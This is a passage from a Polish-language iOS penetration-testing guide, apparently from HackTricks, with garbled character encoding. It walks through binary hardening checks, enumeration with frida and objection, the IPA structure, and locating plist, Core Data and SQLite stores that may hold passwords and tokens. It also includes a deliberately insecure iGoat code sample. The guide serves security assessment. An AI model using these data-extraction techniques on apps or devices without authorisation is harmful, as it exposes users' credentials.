# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ zadania** przy uÅ¼yciu najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ci.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawy iOS

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Åšrodowisko testowe

Na tej stronie znajdziesz informacje na temat **symulatora iOS**, **emulatorÃ³w** i **jailbreakingu**:

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## Analiza poczÄ…tkowa

### Podstawowe operacje testowe iOS

Podczas testowania **zostanie zaproponowanych kilka operacji** (poÅ‚Ä…czenie z urzÄ…dzeniem, odczyt/zapis/przesyÅ‚anie/pobieranie plikÃ³w, korzystanie z niektÃ³rych narzÄ™dzi...). JeÅ›li nie wiesz, jak wykonaÄ‡ ktÃ³rÄ…Å› z tych czynnoÅ›ci, **zacznij od przeczytania strony**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Aby wykonaÄ‡ nastÄ™pujÄ…ce kroki, **aplikacja powinna byÄ‡ zainstalowana** na urzÄ…dzeniu, a **plik IPA** aplikacji powinien juÅ¼ zostaÄ‡ uzyskany.\
Przeczytaj stronÄ™ [Podstawowe operacje testowe iOS](basic-ios-testing-operations.md), aby dowiedzieÄ‡ siÄ™, jak to zrobiÄ‡.
{% endhint %}

### Podstawowa analiza statyczna

Zaleca siÄ™ uÅ¼ycie narzÄ™dzia [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF), aby przeprowadziÄ‡ automatycznÄ… analizÄ™ statycznÄ… pliku IPA.

Identyfikacja **zabezpieczeÅ„ obecnych w binarnym pliku**:

*   **PIE (Position Independent Executable)**: Po wÅ‚Ä…czeniu aplikacja Å‚adowana jest pod losowy adres pamiÄ™ci za kaÅ¼dym razem, gdy jest uruchamiana, co utrudnia przewidywanie jej poczÄ…tkowego adresu pamiÄ™ci.

```bash
otool -hv <app-binary> | grep PIE   # Powinno zawieraÄ‡ flagÄ™ PIE
```
*   **Stack Canaries**: W celu sprawdzenia integralnoÅ›ci stosu przed wywoÅ‚aniem funkcji umieszczana jest wartoÅ›Ä‡ â€canaryâ€ na stosie, a nastÄ™pnie sprawdzana ponownie po zakoÅ„czeniu funkcji.

```bash
otool -I -v <app-binary> | grep stack_chk   # Powinno zawieraÄ‡ symbole: stack_chk_guard i stack_chk_fail
```
*   **ARC (Automatic Reference Counting)**: W celu zapobiegania powszechnym bÅ‚Ä™dom korupcji pamiÄ™ci

```bash
otool -I -v <app-binary> | grep objc_release   # Powinno zawieraÄ‡ symbol _objc_release
```
*   **Zaszyfrowany plik binarny**: Plik binarny powinien byÄ‡ zaszyfrowany

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # WartoÅ›Ä‡ cryptid powinna wynosiÄ‡ 1
```

**Identyfikacja funkcji wraÅ¼liwych/niebezpiecznych**

*   **SÅ‚abe algorytmy haszujÄ…ce**

```bash
# Na urzÄ…dzeniu iOS
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Na systemie Linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Niebezpieczne funkcje losowe**

```bash
# Na urzÄ…dzeniu iOS
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Na systemie Linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Niebezpieczna funkcja â€Mallocâ€**

```bash
# Na urzÄ…dzeniu iOS
otool -Iv <app> | grep -w "_malloc"

# Na systemie Linux
grep -iER "_malloc"
```
*   **Niebezpieczne i podatne na ataki funkcje**

```bash
# Na urzÄ…dzeniu iOS
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Na systemie Linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Podstawowa analiza dynamiczna

SprawdÅº analizÄ™ dynamicznÄ…, ktÃ³rÄ… wykonuje [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF). BÄ™dziesz musiaÅ‚ poruszaÄ‡ siÄ™ po rÃ³Å¼nych widokach i wchodziÄ‡ w interakcjÄ™ z nimi, ale narzÄ™dzie to bÄ™dzie podÅ‚Ä…czaÄ‡ siÄ™ do wielu klas i wykonywaÄ‡ inne czynnoÅ›ci, a nastÄ™pnie przygotuje raport po zakoÅ„czeniu.

### WyÅ›wietlanie zainstalowanych aplikacji

UÅ¼yj polecenia `frida-ps -Uai`, aby okreÅ›liÄ‡ **identyfikator pakietu** zainstalowanych aplikacji:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Podstawowe wyliczanie i hookowanie

Dowiedz siÄ™, jak **wyliczaÄ‡ skÅ‚adniki aplikacji** i jak Å‚atwo **hookowaÄ‡ metody i klasy** za pomocÄ… narzÄ™dzia objection:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### Struktura pliku IPA

Struktura pliku **IPA** jest w zasadzie strukturÄ… **spakowanego archiwum**. Po zmianie rozszerzenia na `.zip`, moÅ¼na je **rozpakowaÄ‡**, aby zobaczyÄ‡ jego zawartoÅ›Ä‡. W tej strukturze **Bundle** reprezentuje w peÅ‚ni spakowanÄ… aplikacjÄ™ gotowÄ… do instalacji. WewnÄ…trz znajduje siÄ™ katalog o nazwie `<NAZWA>.app`, ktÃ³ry zawiera zasoby aplikacji.

* **`Info.plist`**: Ten plik zawiera szczegÃ³Å‚owe informacje konfiguracyjne aplikacji.
* **`_CodeSignature/`**: Ten katalog zawiera plik plist, ktÃ³ry zawiera podpis, zapewniajÄ…cy integralnoÅ›Ä‡ wszystkich plikÃ³w w pakiecie.
* **`Assets.car`**: Skompresowane archiwum przechowujÄ…ce pliki zasobÃ³w, takie jak ikony.
* **`Frameworks/`**: Ten folder zawiera natywne biblioteki aplikacji, ktÃ³re mogÄ… mieÄ‡ postaÄ‡ plikÃ³w `.dylib` lub `.framework`.
* **`PlugIns/`**: MoÅ¼e zawieraÄ‡ rozszerzenia aplikacji, znane jako pliki `.appex`, chociaÅ¼ nie zawsze sÄ… obecne.
*Â [**`Core Data`**](https://developer.apple.com/documentation/coredata): SÅ‚uÅ¼y do zapisywania trwaÅ‚ych danych aplikacji do uÅ¼ytku w trybie offline, do buforowania danych tymczasowych i dodawania funkcji cofania w aplikacji na jednym urzÄ…dzeniu. Aby synchronizowaÄ‡ dane miÄ™dzy wieloma urzÄ…dzeniami w jednym koncie iCloud, Core Data automatycznie odbija schemat w kontenerze CloudKit.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): Plik `PkgInfo` to alternatywny sposÃ³b okreÅ›lania typu i kodÃ³w twÃ³rcy aplikacji lub pakietu.
* **en.lproj, fr.proj, Base.lproj**: SÄ… to pakiety jÄ™zykowe zawierajÄ…ce zasoby dla konkretnych jÄ™zykÃ³w oraz domyÅ›lne zasoby w przypadku braku obsÅ‚ugi danego jÄ™zyka.
* **BezpieczeÅ„stwo**: Katalog `_CodeSignature/` odgrywa kluczowÄ… rolÄ™ w bezpieczeÅ„stwie aplikacji, weryfikujÄ…c integralnoÅ›Ä‡ wszystkich doÅ‚Ä…czonych plikÃ³w za pomocÄ… podpisÃ³w cyfrowych.
* **ZarzÄ…dzanie zasobami**: Plik `Assets.car` wykorzystuje kompresjÄ™ do efektywnego zarzÄ…dzania zasobami graficznymi, co jest istotne dla optymalizacji wydajnoÅ›ci aplikacji i zmniejszenia jej rozmiaru.
* **Frameworks i PlugIns**: Te katalogi podkreÅ›lajÄ… modularnoÅ›Ä‡ aplikacji iOS, pozwalajÄ…c programistom na doÅ‚Ä…czanie wielokrotnego uÅ¼ytku bibliotek kodu (`Frameworks/`) i rozszerzanie funkcjonalnoÅ›ci aplikacji (`PlugIns/`).
* **Lokalizacja**: Struktura obsÅ‚uguje wiele jÄ™zykÃ³w, uÅ‚atwiajÄ…c globalne dotarcie aplikacji poprzez doÅ‚Ä…czanie zasobÃ³w dla konkretnych pakietÃ³w jÄ™zykowych.

**Info.plist**

**Info.plist** peÅ‚ni rolÄ™ podstawowÄ… dla aplikacji iOS, zawierajÄ…c kluczowe dane konfiguracyjne w postaci par **klucz-wartoÅ›Ä‡**. Ten plik jest niezbÄ™dny nie tylko dla aplikacji, ale takÅ¼e dla rozszerzeÅ„ aplikacji i bibliotek doÅ‚Ä…czonych. MoÅ¼e mieÄ‡ strukturÄ™ XML lub format binarny i zawiera waÅ¼ne informacje, od uprawnieÅ„ aplikacji po konfiguracje zabezpieczeÅ„. Aby dokÅ‚adnie poznaÄ‡ dostÄ™pne klucze, moÅ¼na odwoÅ‚aÄ‡ siÄ™ do [**Dokumentacji dla deweloperÃ³w Apple**](https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc).

Dla osÃ³b, ktÃ³re chcÄ… pracowaÄ‡ z tym plikiem w bardziej dostÄ™pnym formacie, konwersjÄ™ na format XML moÅ¼na Å‚atwo osiÄ…gnÄ…Ä‡ za pomocÄ… narzÄ™dzia `plutil` na macOS (dostÄ™pnego natywnie w wersjach 10.2 i nowszych) lub `plistutil` na Linuxie. PoniÅ¼ej przedstawiamy polecenia konwersji:

- **Dla macOS**:
```bash
$ plutil -convert xml1 Info.plist
```
- **Dla systemu Linux**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
WÅ›rÃ³d licznych informacji, ktÃ³re plik **Info.plist** moÅ¼e ujawniÄ‡, warto wymieniÄ‡ ciÄ…gi uprawnieÅ„ aplikacji (`UsageDescription`), niestandardowe schematy URL (`CFBundleURLTypes`) oraz konfiguracje dla bezpieczeÅ„stwa transportu aplikacji (`NSAppTransportSecurity`). Te wpisy, wraz z innymi, takimi jak eksportowane/importowane niestandardowe typy dokumentÃ³w (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`), moÅ¼na Å‚atwo zlokalizowaÄ‡, przeglÄ…dajÄ…c plik lub uÅ¼ywajÄ…c prostego polecenia `grep`:
```bash
$ grep -i <keyword> Info.plist
```
**ÅšcieÅ¼ki danych**

W Å›rodowisku iOS istniejÄ… specjalnie wyznaczone katalogi dla **aplikacji systemowych** i **aplikacji zainstalowanych przez uÅ¼ytkownika**. Aplikacje systemowe znajdujÄ… siÄ™ w katalogu `/Applications`, podczas gdy aplikacje zainstalowane przez uÅ¼ytkownika sÄ… umieszczone w `/private/var/containers/`. Te aplikacje sÄ… przypisane do unikalnego identyfikatora o nazwie **128-bitowy UUID**, co utrudnia rÄ™czne zlokalizowanie folderu aplikacji ze wzglÄ™du na losowoÅ›Ä‡ nazw katalogÃ³w.

Aby uÅ‚atwiÄ‡ odkrywanie katalogu instalacyjnego aplikacji zainstalowanej przez uÅ¼ytkownika, narzÄ™dzie **objection** udostÄ™pnia przydatne polecenie `env`. To polecenie ujawnia szczegÃ³Å‚owe informacje o katalogu dla danej aplikacji. PoniÅ¼ej znajduje siÄ™ przykÅ‚ad uÅ¼ycia tego polecenia:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Alternatywnie, nazwa aplikacji moÅ¼e byÄ‡ wyszukiwana w folderze `/private/var/containers` za pomocÄ… polecenia `find`:
```bash
find /private/var/containers -name "Progname*"
```
Polecenia takie jak `ps` i `lsof` mogÄ… rÃ³wnieÅ¼ byÄ‡ wykorzystane do zidentyfikowania procesu aplikacji i wylistowania otwartych plikÃ³w, odpowiednio, dostarczajÄ…c informacji na temat aktywnych Å›cieÅ¼ek katalogÃ³w aplikacji:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Katalog pakietu:**

* **AppName.app**
* To jest pakiet aplikacji, ktÃ³ry widzieliÅ›my wczeÅ›niej w pliku IPA. Zawiera on podstawowe dane aplikacji, statycznÄ… zawartoÅ›Ä‡ oraz skompilowany plik binarny aplikacji.
* Ten katalog jest widoczny dla uÅ¼ytkownikÃ³w, ale **uÅ¼ytkownicy nie mogÄ… w nim zapisywaÄ‡**.
* ZawartoÅ›Ä‡ tego katalogu **nie jest tworzona w kopii zapasowej**.
* ZawartoÅ›Ä‡ tego folderu jest uÅ¼ywana do **weryfikacji podpisu kodu**.

**Katalog danych:**

* **Documents/**
* Zawiera wszystkie dane generowane przez uÅ¼ytkownika. Tworzenie tych danych inicjuje uÅ¼ytkownik koÅ„cowy aplikacji.
* Widoczne dla uÅ¼ytkownikÃ³w i **uÅ¼ytkownicy mogÄ… w nim zapisywaÄ‡**.
* ZawartoÅ›Ä‡ tego katalogu jest **tworzona w kopii zapasowej**.
* Aplikacja moÅ¼e wyÅ‚Ä…czyÄ‡ Å›cieÅ¼ki, ustawiajÄ…c `NSURLIsExcludedFromBackupKey`.
* **Library/**
* Zawiera wszystkie **pliki, ktÃ³re nie sÄ… specyficzne dla uÅ¼ytkownika**, takie jak **pamiÄ™Ä‡ podrÄ™czna**, **preferencje**, **ciasteczka** oraz pliki konfiguracyjne plist.
* Aplikacje iOS zazwyczaj korzystajÄ… z podkatalogÃ³w `Application Support` i `Caches`, ale aplikacja moÅ¼e tworzyÄ‡ niestandardowe podkatalogi.
* **Library/Caches/**
* Zawiera **pÃ³Å‚trwaÅ‚e pliki podrÄ™czne**.
* Niewidoczne dla uÅ¼ytkownikÃ³w i **uÅ¼ytkownicy nie mogÄ… w nim zapisywaÄ‡**.
* ZawartoÅ›Ä‡ tego katalogu **nie jest tworzona w kopii zapasowej**.
* System operacyjny moÅ¼e automatycznie usuwaÄ‡ pliki z tego katalogu, gdy aplikacja nie jest uruchomiona i brakuje miejsca na dysku.
* **Library/Application Support/**
* Zawiera **trwaÅ‚e pliki** niezbÄ™dne do dziaÅ‚ania aplikacji.
* Niewidoczne dla uÅ¼ytkownikÃ³w i uÅ¼ytkownicy nie mogÄ… w nim zapisywaÄ‡.
* ZawartoÅ›Ä‡ tego katalogu jest **tworzona w kopii zapasowej**.
* Aplikacja moÅ¼e wyÅ‚Ä…czyÄ‡ Å›cieÅ¼ki, ustawiajÄ…c `NSURLIsExcludedFromBackupKey`.
* **Library/Preferences/**
* SÅ‚uÅ¼y do przechowywania wÅ‚aÅ›ciwoÅ›ci, ktÃ³re **mogÄ… przetrwaÄ‡ nawet po ponownym uruchomieniu aplikacji**.
* Informacje sÄ… zapisywane w postaci niezaszyfrowanej wewnÄ…trz piaskownicy aplikacji w pliku plist o nazwie \[BUNDLE\_ID].plist.
* Wszystkie pary klucz/wartoÅ›Ä‡ przechowywane za pomocÄ… `NSUserDefaults` moÅ¼na znaleÅºÄ‡ w tym pliku.
* **tmp/**
* UÅ¼ywaj tego katalogu do zapisywania **tymczasowych plikÃ³w**, ktÃ³re nie muszÄ… przetrwaÄ‡ miÄ™dzy uruchomieniami aplikacji.
* Zawiera tymczasowe pliki podrÄ™czne.
* Niewidoczne dla uÅ¼ytkownikÃ³w.
* ZawartoÅ›Ä‡ tego katalogu nie jest tworzona w kopii zapasowej.
* System operacyjny moÅ¼e automatycznie usuwaÄ‡ pliki z tego katalogu, gdy aplikacja nie jest uruchomiona i brakuje miejsca na dysku.

Przyjrzyjmy siÄ™ bliÅ¼ej katalogowi pakietu aplikacji iGoat-Swift (.app) w katalogu Bundle (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Odwracanie binarne

WewnÄ…trz folderu `<nazwa-aplikacji>.app` znajdziesz plik binarny o nazwie `<nazwa-aplikacji>`. Jest to plik, ktÃ³ry zostanie **wykonany**. MoÅ¼esz przeprowadziÄ‡ podstawowÄ… inspekcjÄ™ binarnÄ… za pomocÄ… narzÄ™dzia **`otool`**:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**SprawdÅº, czy aplikacja jest zaszyfrowana**

SprawdÅº, czy istnieje jakiekolwiek wyjÅ›cie dla:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**RozkÅ‚adanie binarnego pliku**

RozkÅ‚adanie sekcji tekstowej:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Aby wydrukowaÄ‡ **segment Objective-C** przykÅ‚adowej aplikacji, moÅ¼na uÅ¼yÄ‡:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Aby uzyskaÄ‡ bardziej zwarty kod Objective-C, moÅ¼na uÅ¼yÄ‡ [**class-dump**](http://stevenygard.com/projects/class-dump/):
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Jednak najlepsze opcje do rozkÅ‚adania binarnego to: [**Hopper**](https://www.hopperapp.com/download.html?) i [**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ zadania** przy uÅ¼yciu najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Przechowywanie danych

Aby dowiedzieÄ‡ siÄ™, jak iOS przechowuje dane w urzÄ…dzeniu, przeczytaj tÄ™ stronÄ™:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
NastÄ™pujÄ…ce miejsca do przechowywania informacji powinny byÄ‡ sprawdzane **zaraz po zainstalowaniu aplikacji**, **po sprawdzeniu wszystkich funkcji** aplikacji, a nawet po **wylogowaniu siÄ™ z jednego uÅ¼ytkownika i zalogowaniu siÄ™ na innego**.\
Celem jest znalezienie **niechronionych wraÅ¼liwych informacji** aplikacji (hasÅ‚a, tokeny), bieÅ¼Ä…cego uÅ¼ytkownika i wczeÅ›niej zalogowanych uÅ¼ytkownikÃ³w.
{% endhint %}

### Plist

Pliki **plist** to strukturalne pliki XML, ktÃ³re **zawierajÄ… pary klucz-wartoÅ›Ä‡**. Jest to sposÃ³b przechowywania danych trwaÅ‚ych, wiÄ™c czasami moÅ¼na znaleÅºÄ‡ wraÅ¼liwe informacje w tych plikach. Zaleca siÄ™ sprawdzenie tych plikÃ³w po zainstalowaniu aplikacji i po intensywnym jej uÅ¼yciu, aby sprawdziÄ‡, czy zapisano nowe dane.

NajczÄ™stszy sposÃ³b przechowywania danych w plikach plist to za pomocÄ… **NSUserDefaults**. Ten plik plist jest zapisywany wewnÄ…trz piaskownicy aplikacji w **`Library/Preferences/<appBundleID>.plist`**

Klasa [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) zapewnia programowy interfejs do interakcji z domyÅ›lnym systemem. DomyÅ›lny system pozwala aplikacji dostosowaÄ‡ swoje zachowanie zgodnie z **preferencjami uÅ¼ytkownika**. Dane zapisane przez `NSUserDefaults` moÅ¼na zobaczyÄ‡ w pakiecie aplikacji. Ta klasa przechowuje **dane** w pliku **plist**, ale jest przeznaczona do uÅ¼ytku z maÅ‚ymi iloÅ›ciami danych.

Te dane nie mogÄ… byÄ‡ bezpoÅ›rednio dostÄ™pne za pomocÄ… zaufanego komputera, ale moÅ¼na do nich uzyskaÄ‡ dostÄ™p wykonujÄ…c **kopiÄ™ zapasowÄ…**.

MoÅ¼esz **wydobyÄ‡** zapisane informacje za pomocÄ… **`NSUserDefaults`** przy uÅ¼yciu polecenia `ios nsuserdefaults get` w narzÄ™dziu objection.

Aby znaleÅºÄ‡ wszystkie pliki plist uÅ¼ywane przez aplikacjÄ™, moÅ¼esz uzyskaÄ‡ dostÄ™p do `/private/var/mobile/Containers/Data/Application/{APPID}` i uruchomiÄ‡:
```bash
find ./ -name "*.plist"
```
Aby przekonwertowaÄ‡ pliki z formatu **XML lub binarnego (bplist)** na format XML, dostÄ™pne sÄ… rÃ³Å¼ne metody w zaleÅ¼noÅ›ci od systemu operacyjnego:

**Dla uÅ¼ytkownikÃ³w macOS:**
Wykorzystaj polecenie `plutil`. Jest to wbudowane narzÄ™dzie w macOS (10.2+), zaprojektowane w tym celu:
```bash
$ plutil -convert xml1 Info.plist
```
**Dla uÅ¼ytkownikÃ³w Linuxa:**
Najpierw zainstaluj `libplist-utils`, a nastÄ™pnie uÅ¼yj `plistutil`, aby przekonwertowaÄ‡ plik:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**W trakcie sesji Objection:**
Do analizy aplikacji mobilnych istnieje specjalne polecenie, ktÃ³re umoÅ¼liwia bezpoÅ›redniÄ… konwersjÄ™ plikÃ³w plist:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1) to framework do zarzÄ…dzania warstwÄ… modelu obiektÃ³w w Twojej aplikacji. [Core Data moÅ¼e uÅ¼ywaÄ‡ SQLite jako swojego trwaÅ‚ego magazynu](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), ale sam framework nie jest bazÄ… danych.\
CoreData domyÅ›lnie nie szyfruje swoich danych. Jednak moÅ¼na dodaÄ‡ dodatkowÄ… warstwÄ™ szyfrowania do CoreData. WiÄ™cej szczegÃ³Å‚Ã³w znajdziesz w [repozytorium GitHub](https://github.com/project-imas/encrypted-core-data).

Informacje o bazie danych SQLite Core Data aplikacji znajdziesz w Å›cieÅ¼ce `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**JeÅ›li moÅ¼esz otworzyÄ‡ SQLite i uzyskaÄ‡ dostÄ™p do wraÅ¼liwych informacji, oznacza to, Å¼e znalazÅ‚eÅ› bÅ‚Ä™dnÄ… konfiguracjÄ™.**

{% code title="Kod z iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) to sklep kluczy/wartoÅ›ci zbudowany na bazie SQLite.\
PoniewaÅ¼ bazy danych Yap sÄ… bazami danych SQLite, moÅ¼na je znaleÅºÄ‡, uÅ¼ywajÄ…c polecenia opisanego w poprzedniej sekcji.

### Inne bazy danych SQLite

CzÄ™sto aplikacje tworzÄ… swoje wÅ‚asne bazy danych SQLite. MogÄ… w nich przechowywaÄ‡ **wraÅ¼liwe dane** i pozostawiaÄ‡ je niezaszyfrowane. Dlatego zawsze warto sprawdziÄ‡ kaÅ¼dÄ… bazÄ™ danych w katalogu aplikacji. PrzejdÅº do katalogu aplikacji, w ktÃ³rym sÄ… przechowywane dane (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Bazy danych Firebase Real-Time

Deweloperzy majÄ… moÅ¼liwoÅ›Ä‡ **przechowywania i synchronizacji danych** w **bazie danych NoSQL hostowanej w chmurze** za pomocÄ… Firebase Real-Time Databases. Dane sÄ… przechowywane w formacie JSON i synchronizowane w czasie rzeczywistym do wszystkich podÅ‚Ä…czonych klientÃ³w.

Jak sprawdziÄ‡, czy bazy danych Firebase sÄ… Åºle skonfigurowane, moÅ¼na znaleÅºÄ‡ tutaj:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Bazy danych Realm

